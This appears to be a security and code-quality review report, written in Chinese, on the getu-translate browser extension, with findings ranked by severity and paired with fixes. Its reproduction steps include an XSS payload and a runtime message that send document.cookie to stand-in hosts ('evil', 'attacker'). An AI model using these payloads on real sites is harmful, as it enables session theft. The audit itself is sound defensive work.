# getu-translate 扩展 — 代码评审报告

- **范围**: `apps/extension/` (WXT 0.20.22 MV3 扩展，~118 k LOC)
- **基线 SHA**: `8bc43730f66b214669d7f53c3e15239b25816fb` (`feature/trusting-murdock-720dd8`)
- **评审日期**: 2026-04-26
- **方法**: 并行派发 6 个独立 `code-reviewer` 子代理，覆盖 11 个领域；本文档对其结果去重、交叉验证、按严重度排序。
- **范围之外**: 仅审查代码。**未修改任何文件**。

---

## 0. 执行摘要 (Executive Summary)

扩展整体工程质量较高（清晰的模块划分、合理的 Jotai/TanStack Query 使用、Zod 校验在多处到位、对 MV3 上下文失效错误的吞咽逻辑构造良好），但在 **核心翻译管线、background SW 生命周期、消息边界、OAuth/凭据存储** 这几个关键面上存在多个真实可利用或易触发的问题。

### Top-Level 必修 (release blocker)

1. **真实 XSS — 翻译结果直接 `innerHTML`** — `apps/extension/src/utils/host/translate/core/translation-modes.ts:302`。被 Reviewer C 和 E **独立**指认。任意 LLM provider（包括用户自配 openai-compatible 的恶意 baseURL、被劫持的 API、被破坏的供应链）返回 `<img src=x onerror=...>` 即在宿主页面执行。
2. **`backgroundFetch` 是无差别 SSRF / 凭据代理** — `apps/extension/src/entrypoints/background/proxy-fetch.ts:88–191`。无 URL 白名单、无 `sender.id` 校验、`credentials: "include"` + `host_permissions: *://*/*` + `cookies` 权限。任何被注入的 content script 或后续 messaging bug 都可借此发起带会话 cookie 的任意原点请求。Reviewer D + E 共同指认。
3. **`openPage` 处理器接受任意 URL 无校验** — `apps/extension/src/entrypoints/background/index.ts:47-51`。`browser.tabs.create({ url })` 未做 scheme/origin allowlist。可被用于打开 `javascript:` / 钓鱼页 / 跨扩展导航。
4. **Background 消息处理器在 async gap 后才注册** — `apps/extension/src/entrypoints/background/translation-queues.ts:227,301` (`setUpWebPageTranslationQueue` / `setUpSubtitlesTranslationQueue` 内 `await ensureInitializedConfig()` 之后才 `onMessage(...)`)。MV3 SW 冷启动时被 `enqueueTranslateRequest` 唤醒 → handler 未注册 → 消息丢失 → 整页翻译在 30 s 空闲后首次触发时失败。Reviewer B + D 独立指认。
5. **Firefox AMO source zip 含 `.env.production`** — `apps/extension/wxt.config.ts:87`。CI 在 `release.yml` 中向环境注入 `WXT_GOOGLE_CLIENT_ID` / `WXT_POSTHOG_API_KEY` / `WXT_POSTHOG_HOST`，若任何工具在 build 时落盘成 `.env.production`，这些值会随 AMO 审核源码包公开上传给 Mozilla 审核员。
6. **`translation-cleanup.ts:40` 通过 `innerHTML` 还原快照** — 序列化-反序列化 HTML 会重新解析、重运行解析器，失去事件监听器引用，且当宿主已 SPA 重渲染时还原过期内容。Reviewer C + E 独立指认。
7. **MV3 in-memory 队列 / Map / Set 在 SW eviction 时全部丢失** — `RequestQueue`、`BatchQueue`、`pdfTabs`、`injectedDocumentKeysByFrame`、`pendingDocumentKeys` 等。SW 30 s 空闲被回收时，正在 batch window 等待的翻译片段静默消失；冷启动后 PDF tab 检测错位导致 popup 显示错误按钮。
8. **`setUpConfigBackup` 每次 SW 启动无条件 `alarms.create`** — `apps/extension/src/entrypoints/background/config-backup.ts:13`。每次 SW 唤醒重置 `delayInMinutes:1` 倒计时。频繁浏览的会话里备份 alarm 永远不触发。`setUpDatabaseCleanup` 已正确做了 `if (!existing)` 守卫；该模块没做。Reviewer B + D 独立指认。
9. **`storageAdapter.watch` 静默丢弃 `null` / `undefined` 通知** — `apps/extension/src/utils/atoms/storage-adapter.ts:29-33`。用户清空存储或 restore-from-backup 时，atom 不会重置，UI 长期显示旧值，下一次写回会复活已删除字段（包括已被用户主动删除的 API key）。Reviewer D + F 独立指认。
10. **Google Drive 访问令牌明文存 `chrome.storage.local`，且使用 implicit grant** — `apps/extension/src/utils/google-drive/auth.ts:94`。OAuth 2.1 已弃用 implicit flow；实际效果是 OS 级文件读权限即得到一个不可吊销的 bearer。

### Posture summary

- **构建期密钥泄露防护**：`check-api-key-env` 插件仅匹配 `WXT_.*API_KEY`，对 `WXT_GOOGLE_CLIENT_ID` / `WXT_POSTHOG_HOST` 等命名不在拦截范围，**且 `WXT_ZIP_MODE` 检测的可选变量警告只在 `wxt zip` 时跑**。非 zip 的 `pnpm build` 不触发该检查。
- **测试**：vitest 默认 `environment: "node"`，content-script DOM 逻辑实际跑在缺失 DOM 的 Node 里（`vitest.setup.ts` 仅打 polyfill 不能等价 jsdom）。无 coverage threshold，CI 跑的是 `pnpm test` 而非 `pnpm test:cov`。无端到端测试在真实浏览器中加载扩展。
- **TS 严格度**：`apps/extension/tsconfig.json` 仅 `extends ".wxt/tsconfig.json"` （由 WXT 生成，未提交），未显式开启 `strict` / `noUncheckedIndexedAccess` / `exactOptionalPropertyTypes`。
- **Husky**: `pre-commit` 仅 lint-staged；`type-check` 与 `test` 仅在 `pre-push` 跑；CI release 流程 `HUSKY=0`。
- **MV3 生命周期理解**：数据层（IndexedDB/Dexie）做对了；监听器与 in-flight 状态层未一致地考虑 SW ephemerality。

---

## 1. 评审方法 (Methodology)

并行派发 6 个独立的 `code-reviewer` 子代理（Sonnet），每个仅看到自己领域内的文件清单与指南，不共享其他代理的产出。这样得到的 ~88 个原始发现里，多个独立代理对同一行/同一根因得出一致结论的，作为 **跨评审确认 (cross-reviewer corroboration)** 单列，置信度更高。覆盖范围对应你列出的 11 个领域：

| 代理 | 领域 |
|---|---|
| A | 1 Manifest V3, 7 permissions/host_permissions, 11 build/typecheck/lint/test gaps |
| B | 2 background SW lifecycle |
| C | 3 content script injection & DOM mutation |
| D | 5 chrome.runtime messaging, 6 chrome.storage consistency |
| E | 10 安全 (XSS / unsafe DOM / RCE / token-API key 泄露) |
| F | 4 popup/options state, 8 async race conditions, 9 error handling/fallback |

---

## 2. 跨评审确认 (Cross-Reviewer Corroboration)

由两个或更多代理独立指认的发现 — 优先修复。

| # | 文件:行 | 严重度 | 指认代理 | 简述 |
|---|---|---|---|---|
| X1 | `apps/extension/src/utils/host/translate/core/translation-modes.ts:302` | **critical** | C, E | `innerHTML = translatedText` — LLM 输出直接进 DOM |
| X2 | `apps/extension/src/utils/host/translate/dom/translation-cleanup.ts:40` | **critical** | C, E | `innerHTML = originalContent` 还原快照，失去节点身份 + 重新解析 HTML |
| X3 | `apps/extension/src/entrypoints/background/proxy-fetch.ts:88-191` | **critical** | D, E | `backgroundFetch` 无 URL 白名单、无 sender 校验、`credentials: include` |
| X4 | `apps/extension/src/entrypoints/background/translation-queues.ts:227,301` | **critical** | B, D | 翻译队列消息处理器在 `await ensureInitializedConfig()` 之后才注册 |
| X5 | `apps/extension/src/entrypoints/background/config-backup.ts:13` | **critical** | B, D | `alarms.create` 无 `existing` 守卫，每次 SW 启动重置倒计时 |
| X6 | `apps/extension/src/utils/atoms/storage-adapter.ts:29-33` | **critical** | D, F | `watch` 在 `newValue === null` 时静默不调用 callback |
| X7 | `apps/extension/src/entrypoints/guide.content/index.ts:17,29,32-45` | **high** | C, E | postMessage 用 `"*"` + 未校验的 `langCodeISO6393` 直写 storage |
| X8 | `apps/extension/src/utils/google-drive/auth.ts:94` | **high** | D, E | Drive OAuth 访问令牌明文存 `chrome.storage.local`，implicit flow |
| X9 | `apps/extension/wxt.config.ts:71-73` (Firefox CSP) | **medium** | A, E | 移除 `upgrade-insecure-requests` 允许 HTTP provider URL |
| X10 | `apps/extension/src/entrypoints/background/proxy-fetch.ts:72-78,168` | **medium** | D, E | `cookies.onChanged` / fetch response 完整 body 进 INFO 日志 |

---

## 3. Critical 发现 (must fix before next release)

### C-1 翻译结果直接 `innerHTML` —— 真实 XSS（X1）
- **文件**: `apps/extension/src/utils/host/translate/core/translation-modes.ts:302`
- **为什么是真实漏洞**: `translateNodeTranslationOnlyMode` 拿到 LLM 返回的字符串后直接赋给 `translatedWrapperNode.innerHTML`，沿途无任何 sanitizer。Content script 与宿主页面共享 DOM（虽不共享 JS realm），任何 `<img src=x onerror=...>` payload 都会在宿主原点的页面 JS 上下文执行，等价于宿主站存储型 XSS。Bilingual 模式走 `insertTranslatedNodeIntoWrapper` → `textContent`，不受影响 — **只有 "Translation Only" 模式被打穿**。
- **复现**: 在选项里配置 openai-compatible provider，把 `baseURL` 指到攻击者控制的 OpenAI-shape 接口。该接口对任意请求返回 `{"choices":[{"message":{"content":"<img src=x onerror=fetch('https://evil/?c='+document.cookie)>"}}]}`。开启 Translation Only 模式翻译任何页面 → 攻击者拿到目标站会话 cookie。
- **修复**: 用 `translatedWrapperNode.textContent = translatedText` 替换；如真要保留有限富文本，改走 DOMPurify 严格白名单（`ALLOWED_TAGS: ["b","i","em","strong","br"]`，`KEEP_CONTENT: true`）。
- **测试建议**: 是 — vitest jsdom 用例 `mock translateTextForPage` 返回 `<script>window.__xss=1</script>`，断言 `window.__xss` 仍 `undefined`。

### C-2 `innerHTML` 还原原始快照（X2）
- **文件**: `apps/extension/src/utils/host/translate/dom/translation-cleanup.ts:40`
- **为什么是真实漏洞**: `nodeToRestore.innerHTML = originalContent`；`originalContent` 是翻译开始时取的 `outerParentElement.innerHTML` 字符串。HTML 字符串往返意味着：(a) 失去原始事件监听器与节点身份；(b) 若快照之间页面被 SPA 重渲染过，旧 HTML 被强制写回；(c) 若翻译启动前页面已经存在攻击者注入的标记（社媒评论区、UGC），扩展把那段标记重新解析一次 — 任何后续如果该字符串被先做处理后再设为 innerHTML，就成了直接 XSS 入口。
- **复现**: 在 SPA 路由变化期间触发 stop translation；DOM 节点被替换。
- **修复**: 改用节点引用：在快照阶段 `[...el.childNodes]` 浅复制；还原阶段 `el.replaceChildren(...savedNodes)`。彻底消除 HTML 字符串往返。
- **测试**: 是 — 测试 `originalContentMap` 的还原路径不会引入快照外的元素。

### C-3 `backgroundFetch` 无差别 SSRF / 凭据代理（X3）
- **文件**: `apps/extension/src/entrypoints/background/proxy-fetch.ts:88-191`
- **为什么是真实漏洞**: handler 接受任意 `url: string`，调 `fetch(url, { credentials: "include" })`。无 origin allowlist、无 scheme 校验、无 `sender.id === chrome.runtime.id` 断言。Manifest 声明 `host_permissions: *://*/*` + `cookies`。结果：(1) 任何被注入的 content script 都可以借此发起带用户 cookie 的任意原点请求，包括 RFC 1918 内网、`http://localhost`、扩展自身后端；(2) 完整请求/响应 body 还被 `logger.info` 打印（行 88、168），可在 chrome://extensions 控制台看到。
- **复现**: `chrome.runtime.sendMessage({type:"backgroundFetch", data:{url:"https://attacker/?c="+document.cookie, credentials:"include"}})` （从任意被注入的 content script）。
- **修复**: 维护 `ALLOWED_PROXY_ORIGINS` 集合（API_URL、known provider 域名）；未命中即拒；移除 INFO 级别 body 日志，仅记录 method+url+status。
- **测试**: 是 — 单元测试断言非白名单 URL 被拒。

### C-4 `openPage` 接受任意 URL 无校验
- **文件**: `apps/extension/src/entrypoints/background/index.ts:47-51`
- **为什么是真实漏洞**: handler 直接 `browser.tabs.create({ url })`。无 scheme 校验、无 origin 校验、无 sender 校验。可被用于打开 `javascript:`、`data:text/html,...`、扩展内部页（如 options 的危险路径）。
- **复现**: 同上，content script 触发 `sendMessage("openPage", { url: "javascript:alert(1)" })` → 浏览器 tab 加载 `javascript:` URL（部分情况会在原 tab 上下文执行）。
- **修复**: 校验 `new URL(url).protocol === "https:"` 或匹配 `OFFICIAL_SITE_URL_PATTERNS`/`API_URL` 白名单；assert `sender.id === chrome.runtime.id`。
- **测试**: 是。

### C-5 翻译队列消息处理器在 async gap 后才注册（X4）
- **文件**: `apps/extension/src/entrypoints/background/translation-queues.ts:227,301`，调用者 `apps/extension/src/entrypoints/background/index.ts:96-97`
- **为什么是真实漏洞**: MV3 要求所有事件监听器在 SW 唤醒的同步刻就注册。`setUpWebPageTranslationQueue` 是 async fn，第一行就 `await ensureInitializedConfig()`，之后才 `onMessage("enqueueTranslateRequest", ...)`。`index.ts` 中又是 `void setUpWebPageTranslationQueue()` fire-and-forget。冷启动时正是 `enqueueTranslateRequest` 唤醒 SW → SW 执行模块顶层代码 → 进入 await → 此时 Chrome 把消息分发到 `chrome.runtime.onMessage`，**没有 handler，消息丢失**，content script 端收到 "Could not establish connection" 错误或永远等待。
- **复现**: 关闭 DevTools 让 SW idle eviction → 触发任何整页翻译（自动翻译/快捷键）。冷启动首次翻译失败。
- **修复**: 在模块顶层同步注册一个 stub `onMessage("enqueueTranslateRequest", async (msg) => { await queueReady; return realHandler(msg) })`；用一个 `queueReady = (async () => { await ensureInitializedConfig(); requestQueue = ...; })()` Promise 让 stub 排队等待。
- **测试**: 是 — vitest 模拟 SW 冷启动时序。

### C-6 `BatchQueue` / `RequestQueue` in-memory 状态在 SW eviction 时全丢
- **文件**: `apps/extension/src/utils/request/batch-queue.ts:41,107`, `apps/extension/src/utils/request/request-queue.ts:29,118`
- **为什么是真实漏洞**: 队列结构（`pendingBatchMap`、`waitingTasks`、`executingTasks`）和 `setTimeout` 调度器都是 SW 模块作用域内存。SW 在 batch window 还没到的等待期被回收 → 定时器与队列同时蒸发 → content script 端 `sendMessage("enqueueTranslateRequest")` 永远拿不到响应（连接断开）。无重试、无持久化。长页面 + 多片段在 batchDelay 较大时尤其明显。
- **复现**: 配置较长 batchDelay；触发翻译；停止用户活动让 SW 被回收。部分片段无翻译结果。
- **修复**: 同 C-5，在 stub handler 内合并：把片段 enqueue 后立即返回一个由后续 batch flush 兑现的 promise；用 `chrome.runtime.connect` long-lived port 替代 sendMessage 让 SW 在客户端连接期间保活；或当 `pendingBatchMap` 非空时设置 1-min `chrome.alarms` 保活并在 alarm handler 内 flush。
- **测试**: 是 — 集成测试模拟 SW restart mid-batch。

### C-7 `setUpConfigBackup` 无条件 `alarms.create`（X5）
- **文件**: `apps/extension/src/entrypoints/background/config-backup.ts:13`
- **为什么是真实漏洞**: 每次 SW 启动都 `browser.alarms.create(CONFIG_BACKUP_ALARM, { delayInMinutes: 1, periodInMinutes: ... })`。Chrome 对同名 alarm 是 **替换** 语义 → `delayInMinutes: 1` 倒计时被重置。频繁浏览会话里 SW 频繁唤醒 → backup alarm 永远等不到第一次 fire。`setUpDatabaseCleanup` 在 db-cleanup.ts:24 已正确用 `existingAlarm = await browser.alarms.get(name)` 守卫。
- **复现**: 用浏览器持续浏览；`chrome://extensions/?id=...` background SW Console 内监听 `chrome.alarms.onAlarm` 永远不收到 `config-backup`。
- **修复**: 拷贝 db-cleanup 模式 — 先 `alarms.get`，仅当不存在时才 create。
- **测试**: 是 — 单元测试模拟二次启动不重置 alarm。

### C-8 `storageAdapter.watch` 静默丢弃 null（X6）
- **文件**: `apps/extension/src/utils/atoms/storage-adapter.ts:29-33`
- **为什么是真实漏洞**: `watch(callback)` 只在 `isNonNullish(newValue)` 时调 `callback(newValue)`。WXT `storage.watch` 在 `removeItem`/clear/restore-from-backup 时 fire `null`。结果 atom 端永远收不到 reset 通知 → UI 显示已删除前的旧 config → 下一次写回 deep-merge 复活已删除字段（**包括用户主动清除的 API key**）。
- **复现**: 选项页删除某条 provider config → DevTools storage 已删；popup/options atom 仍展示旧值；触发任意写回 → 旧 provider config 重新出现。
- **修复**: `watch` 接受 `fallback`：`callback(isNonNullish(newValue) ? newValue : fallback)`。或在 watch 闭包中读 `defaultValue` 注入。
- **测试**: 是。

### C-9 内容脚本 `lifecycleGuardInstalled` 是模块单例，多 content script 共享时静默 no-op
- **文件**: `apps/extension/src/utils/extension-lifecycle.ts:114`
- **为什么是真实漏洞**: 模块顶层 `let lifecycleGuardInstalled = false`。在 ESM 共享 module instance 的情况下（WXT 的多 entry points 在同一 page realm 共用 module），第一个 content script (`host.content`) 注册后，第二个 (`selection.content`) 调用同一函数时 `lifecycleGuardInstalled === true`，**直接 return**，但记录的 `scriptName` 仍是第一个的 → 排错时定位错误源；并且第二个 script 的 `unhandledrejection` 实际上由第一个的注册兜底（看似没问题），但 `__resetLifecycleGuardForTests` 接口暗示作者预期每个 script 独立 guard。
- **复现**: 同时启用 host + selection content；两次调用 `installContentScriptLifecycleGuard`；第二次记录的 script name 错位。
- **修复**: 改为 `WeakMap<Window, Set<string>>` 按 window + scriptName 维度。
- **测试**: 是。

### C-10 `interceptor.content` 永久污染 `XMLHttpRequest.prototype`（无还原）
- **文件**: `apps/extension/src/entrypoints/interceptor.content/timedtext-observer.ts:48-61`
- **为什么是真实漏洞**: `setupTimedtextObserver` 替换 `XMLHttpRequest.prototype.open` / `send`。无 `pagehide` / `unload` 还原；YouTube 是 SPA，tab 永不 fully unload；扩展 reload 时 content script 上下文失效但 prototype 替换仍在 page realm 持续有效。任何 YouTube 自身脚本/广告/嵌入都被替换后的版本拦截。同时 `timedtextUrlCache` Map 无大小上限，长会话累积上百个含 `pot` 凭据的 URL 永驻内存。
- **复现**: 加载 YouTube → 反复换视频 → DevTools 观察 `XMLHttpRequest.prototype.open !== window.XMLHttpRequest.prototype.open` 永真。
- **修复**: (a) 加 `setupCalled` idempotent guard；(b) 在 `pagehide` 还原 prototype；(c) 用 `Proxy` 而非直接替换；(d) `timedtextUrlCache` 改 LRU 上限 5 项。
- **测试**: 是。

### C-11 `upgrade-success` 入口无 ErrorBoundary，亦无服务端会话校验
- **文件**: `apps/extension/src/entrypoints/upgrade-success/main.tsx:18-43,96`
- **为什么是真实漏洞**: (a) 直接 `createRoot(...).render(<App/>)`，未包 `RecoveryBoundary` — `orpcClient.billing.getEntitlements` 在轮询外的 module-load 错误（断网、auth 失效）会让根崩溃成白屏；(b) Pro 状态判断完全客户端：`location.search === "?cancelled=1"` 是不可信 URL 参数，"You're now on Pro!" 仅靠 client-side `entitlements.tier === "pro"` 判定，恶意用户/缓存可绕过。
- **复现**: 直接访问 `/upgrade-success` 而无支付完成；若本地 entitlements cache 含 pro tier，confetti 触发。
- **修复**: 包 `RecoveryBoundary`；让 redirect 携带后端签名的 `session_id`，用 `orpcClient.billing.verifyCheckoutSession({sessionId})` 做服务端校验。
- **测试**: 是。

### C-12 `src/entrypoints/background/index.ts:96-97` `void` 多个 async setup —— 静默丢弃 setup 错误
- **文件**: `apps/extension/src/entrypoints/background/index.ts:96-97`
- **为什么是真实漏洞**: `void setUpWebPageTranslationQueue()` / `void setUpSubtitlesTranslationQueue()` 不仅造成 C-5 那样的冷启动 race，也会吞掉 setup 阶段任何抛出（`ensureInitializedConfig` 失败、provider 注册失败）。背景 SW 看似活着，所有翻译消息却永久无 handler。
- **修复**: 同 C-5；同时 `.catch(logger.error)` 显式记录失败。
- **测试**: 是。

---

## 4. High 发现

### H-1 Firefox AMO source zip 含 `.env.production`
- `apps/extension/wxt.config.ts:87` `includeSources: [".env.production"]`
- 风险: WXT zip 命令打包 `*-sources.zip` 提交 AMO；`.env.production` 携带 `WXT_GOOGLE_CLIENT_ID`/`WXT_POSTHOG_*` 给 Mozilla 审核员可见。CI `release.yml:64-68` 会把 secrets 注入环境，`pnpm zip:firefox` 时若任何工具/构建步骤把它落盘成 `.env.production`，就一并上传。
- 修复: 从 `includeSources` 移除；如必须，预处理脚本把 values 替换为 `REDACTED`。
- 测试: 是 — CI 步骤校验 sources zip 内 `.env.production` 不含 `=<value>`。

### H-2 `check-api-key-env` 拦截规则有遗漏
- `apps/extension/wxt.config.ts:113-158`
- 风险: regex `WXT_.*API_KEY` 匹配不到 `WXT_GOOGLE_CLIENT_ID`、`WXT_POSTHOG_HOST`；可选变量警告仅 `WXT_ZIP_MODE` 时跑 → 普通 `pnpm build` 静默打包未授权 secret。
- 修复: 扩展 regex；把可选变量警告挪到所有 production build 必跑。
- 测试: 是 — 单元测试 `buildStart`。

### H-3 vitest 默认环境 `"node"`
- `apps/extension/vitest.config.ts:12`
- 风险: 7 个 content script 与所有 React 组件实测无 jsdom，`vitest.setup.ts` 只 polyfill `TextEncoder` / `MemoryStorage`。所有依赖 DOM 的 host/selection/subtitles 代码事实上 **未被测试**。
- 修复: 默认 `environment: "jsdom"`；纯工具/background 文件加 `// @vitest-environment node`。
- 测试: 是 — 在某 content script 写一个 canary 断言 `document instanceof Document`。

### H-4 无 coverage 阈值，CI 未跑 `test:cov`
- `apps/extension/vitest.config.ts:16-21`，`.github/workflows/pr-test.yml`
- 风险: 删光所有测试 `pnpm test:cov` 仍 exit 0；PR 时只跑 `pnpm test` 看不到 coverage。
- 修复: 加 `coverage.thresholds: { lines: 60, functions: 60 }`；CI 改跑 `pnpm test:cov`。
- 测试: 是（即修复本身）。

### H-5 Firefox CSP 删除 `upgrade-insecure-requests`（X9）
- `apps/extension/wxt.config.ts:71-73`
- 风险: 用户配置 `http://192.168.x.x:11434` 的本地 provider 时翻译 prompt（含页面敏感内容）走明文。Chrome 不受影响。
- 修复: 在 UI 显式警告非 localhost 的 http URL；保留 CSP override 但加文档与 telemetry。
- 测试: 否 — UX 警告而非代码正确性。

### H-6 host_permissions `*://*/*` + 5 条具体域名条目重复
- `apps/extension/wxt.config.ts:49-58`
- 风险: 5 条具体域名被通配符覆盖，纯 dead config；Chrome Web Store 审查越来越严苛宽通配符要求 `optional_host_permissions`。
- 修复: 删除冗余项；考虑 `optional_host_permissions: ["*://*/*"]` + 首次翻译时 runtime 申请。
- 测试: 否。

### H-7 `cookies` 权限范围未最小化
- `apps/extension/wxt.config.ts:37`，使用点 `apps/extension/src/entrypoints/background/proxy-fetch.ts:36-85`
- 风险: 仅用于 auth cookie 失效 → 缓存 invalidation。`cookies` 权限触发 Chrome 安装提示扩大化。可由 `webRequest` 监听 auth 域 onCompleted 替代。
- 修复: 评估替代；若保留，在文档与代码注释中声明仅监听 `AUTH_DOMAINS`。
- 测试: 是。

### H-8 `pre-commit` 不跑 type-check
- `.husky/pre-commit:1`
- 风险: 类型坏的代码可 commit；只有 `pre-push` 会拦。`HUSKY=0` 在 release CI 完全关闭 hooks → 唯一防线变成 CI 显式步骤。
- 修复: `lint-staged` 加 `tsc --noEmit` 或 `pre-commit` 加一行 `pnpm type-check`。
- 测试: 否。

### H-9 background `setInterval` fallback 永远跑不久（Firefox 路径）
- `apps/extension/src/entrypoints/background/new-user-guide.ts:24`
- 风险: SW idle 时 setInterval 静默死亡；每次 SW restart 又新建一个不存 handle 不能 clear → N 次 restart 累积 N 个并行 1 s 轮询；最终都被 evict，再不发 `pinStateChanged`。
- 修复: 用 `chrome.alarms`（最小 1 min），或仅依赖 `onUserSettingsChanged` 并文档化 Firefox 不支持。
- 测试: 是。

### H-10 `iframe-injection.ts` 跨 SW restart 双注入
- `apps/extension/src/entrypoints/background/iframe-injection.ts:7-8,93-100`
- 风险: 模块级 `pendingDocumentKeys` Set + `injectedDocumentKeysByFrame` Map 在 SW restart 时清零；下次 webNavigation event 唤醒时 dedup 永假；活着的 iframe 会被再注入一次 → 重复事件监听 / 双 React root / 消息冲突。Firefox 因无 `documentId` 完全跳过 dedup，更糟。
- 修复: 用 `executeScript` 探测 sentinel global（`window.__READ_FROG_SELECTION_INJECTED__`）后再 inject；让 dedup 无状态化。
- 测试: 是。

### H-11 `pdf-tab-detect.ts` SW restart 后丢失
- `apps/extension/src/entrypoints/background/pdf-tab-detect.ts:10`
- 风险: `pdfTabs` Set 仅由 `webRequest.onHeadersReceived` 重新填充；SW restart 后已加载的 PDF tab 不会再触发该事件 → popup 调 `isTabPdf` 拿到 false → 显示错误的"Translate"按钮而非"翻译 PDF"。
- 修复: SW startup 时 `chrome.tabs.query({})` + URL `.pdf` 后缀回填；或用 `chrome.storage.session` 持久化。
- 测试: 是。

### H-12 `addBackup` 非原子读改写 — 多 tab 数据丢失
- `apps/extension/src/utils/backup/storage.ts:74-96`
- 风险: popup + options 同时触发 → 两次 `getItem("backup_ids")` 读到同样旧列表 → 各自 splice/append → 后写覆盖前写，前者备份内容已写但 ID 列表里没它 → 永久 orphan 占空间。
- 修复: 全部 backup mutation 由后台 alarm 串行；或加内存级 Promise chain 锁。
- 测试: 是 — 模拟并发 addBackup。

### H-13 `port-streaming` async messageListener 无 outer try/catch
- `apps/extension/src/entrypoints/background/background-stream.ts:135`
- 风险: async listener 抛错时 `port.onMessage.addListener` 不 await → 无 `safePost({type:"error"})` → 客户端只看到通用 disconnect。
- 修复: 整 body 套 outer try/catch，`safePost` 错误后再 `cleanup()`。
- 测试: 是。

### H-14 Google Drive token 明文 `chrome.storage.local` + implicit grant（X8）
- `apps/extension/src/utils/google-drive/auth.ts:94`
- 风险: `chrome.storage.local` 是磁盘明文 LevelDB；implicit grant 不可吊销不可刷新；OS 级文件读权即得到带 `drive.appdata` 的 bearer，借其拉同步配置文件可拿到所有 provider API key。
- 修复: 切到 PKCE authorization code + 服务端代换 short-lived token；或至少改 `chrome.storage.session`。
- 测试: 否 — 架构变更。

### H-15 `entitlementsAtom` 不从缓存结果同步
- `apps/extension/src/hooks/use-entitlements.ts:114-118`
- 风险: `useEffect` 守卫 `!query.data.isFromCache` → 30 s `staleTime` 内服务端 tier 变更不会立即同步到 atom；过期 pro 用户继续使用 pro feature 直到 stale window 失效。
- 修复: 去掉缓存判断，每次 data change 都同步；让 component 自行用 `isFromCache` 决定 UX。
- 测试: 是。

### H-16 翻译卡未接 AbortController — 浪费 token
- `apps/extension/src/entrypoints/translation-hub/components/translation-card.tsx:40-68`
- 风险: 用 `requestIdRef` 仅做"丢弃旧响应"，但 in-flight LLM 调用未被 abort → 用户连按两次 → 两次 token 全付费，第一次结果直接扔。React 19 StrictMode 下 useEffect 双 fire 也会双发请求。
- 修复: 把 `AbortController.signal` 传入 `executeTranslate`；新请求时 abort 旧 controller。
- 测试: 是。

### H-17 `configAtom.onMount` / `themeAtom.onMount` 用 `document.addEventListener` 不护非 page 上下文
- `apps/extension/src/utils/atoms/config.ts:136-144`，`apps/extension/src/utils/atoms/theme.ts:34-41`
- 风险: 任何在 background SW 或 offscreen 文档订阅这些 atom 的代码会因 `document is not defined` 同步抛 → SW 启动崩溃 → 整扩展功能瘫痪。
- 修复: 加 `typeof document !== "undefined"` 守卫。
- 测试: 是 — Node env 下 onMount 不抛。

### H-18 Popup blog notification queries 无 `staleTime`/`retry:false`
- `apps/extension/src/entrypoints/popup/components/blog-notification.tsx:14-22`
- 风险: 每次 popup open → 2 query × 3 retry = 最多 6 个 toast；断网用户体验灾难。`backgroundFetch` 还会把网络 body 进 INFO 日志（参见 X10）。
- 修复: `staleTime: ONE_DAY_MS` + `retry: false` + `meta: { suppressToast: true }`。
- 测试: 是。

### H-19 Global `QueryCache.onError` toast spam（每次 retry 都弹）
- `apps/extension/src/utils/tanstack-query.ts:5-16`
- 风险: 没 `meta.suppressToast` 的 query 在 retry 3 次时 3 个 toast。
- 修复: 仅在最终失败弹一次（`failureCount >= retry+1`）；或挪到 `useMutation`/`useQuery` `onError` per-call。
- 测试: 是。

### H-20 `subtitles.content` `setupNavigationListeners` 无 teardown
- `apps/extension/src/entrypoints/subtitles.content/universal-adapter.ts:197-207`
- 风险: 每次扩展 reload 累积一对 `navigateStart` / `navigateFinish` 监听；handler fire 多次。
- 修复: 返回 cleanup；从 `bootstrapSubtitlesRuntime` 在 `ctx.onInvalidated` 调用。
- 测试: 是。

### H-21 `host.content/listen.ts` `history.pushState` 重复打 patch
- `apps/extension/src/entrypoints/host.content/listen.ts:36-43`
- 风险: `allFrames: true` + 同源 iframe 共享 `top.history` → 重入时第二次 patch 包住第一次 wrapper；cleanup 只还原到 wrapper 而非浏览器原始函数。
- 修复: 标记 `history.pushState.__rfPatched`；二次进入跳过。
- 测试: 是。

### H-22 翻译 MutationObserver 自递归
- `apps/extension/src/entrypoints/host.content/translation-control/page-translation.ts:491-522`
- 风险: observer 监听 `subtree:true, childList:true, attributes:true` + `attributeFilter:["style","class"]`；翻译插入 `<span>` 触发 childList → 再翻译。closest 兜底但 burst-rate DOM 突变下仍频繁重入。
- 修复: 引入 `isProcessingMutation` flag，microtask 内 skip；或 observe-after-mutate 用 `requestIdleCallback`。
- 测试: 是。

### H-23 `protectInternalStyles` 返回值未被消费
- `apps/extension/src/utils/styles.ts:174,201` (调用点 `apps/extension/src/entrypoints/side.content/index.tsx`)
- 风险: 函数返回 `unwatch` 但 side.content 不存不调；扩展 reload 后旧 observer 仍在 page realm 试图重新注入已无人维护的 style。
- 修复: 在 onMount 存返回值，onRemove 调用。或加 ESLint `no-unused-expressions`。
- 测试: 否。

### H-24 `guide.content` 信任 `e.source === window` 但 `postMessage` 用 `*`（X7）
- `apps/extension/src/entrypoints/guide.content/index.ts:17,29,32-45`
- 风险: 三处 `postMessage(msg, "*")` 把 isPinned / 当前语言广播到所有 origin 嵌入 iframe；相同 listener 接受 `source==="read-frog-page"` 直写 storage.targetCode 无 schema 校验，第三方脚本（任何加载到 getutranslate.com 的资源）都能伪造。
- 修复: 改用具体 origin；`langCodeISO6393` 走 `langCodeISO6393Schema.safeParse`。
- 测试: 是。

---

## 5. Medium 发现

| ID | 文件:行 | 简述 | 修复 | 测试 |
|---|---|---|---|---|
| M-1 | `apps/extension/wxt.config.ts:30-32` | dev 用硬编码 RSA `key` 字段，gating 非完全 leak-proof | 加 `process.env.CI` guard；CI 校验产物 `manifest.json` 无 `key` 字段 | 是 |
| M-2 | `apps/extension/wxt.config.ts:9-15,100-112` | `escapeRawNoncharacters` 仅覆盖 U+FFFF/U+FFFE，遗漏 U+FDD0–FDEF 与高平面 nonchar | regex 加 `u` flag + 全集 | 是 |
| M-3 | `apps/extension/tsconfig.json:1-10` | 未显式启用 strict / noUncheckedIndexedAccess | tsconfig 显式开启 | 否 |
| M-4 | `apps/extension/wxt.config.ts:6-8` | `WXT_POSTHOG_API_KEY` 入 bundle，分发后任何用户可拿密钥写 PostHog 项目 | 文档化决策；PostHog 项目限制 ingestion-only；服务端代理 | 否 |
| M-5 | `.github/workflows/submit.yml:55-57` | `--edge-zip ...*-chrome.zip` 把 chrome 包当 edge 提交 | 改为 `*-edge.zip`，先跑 `zip:edge` | 否 |
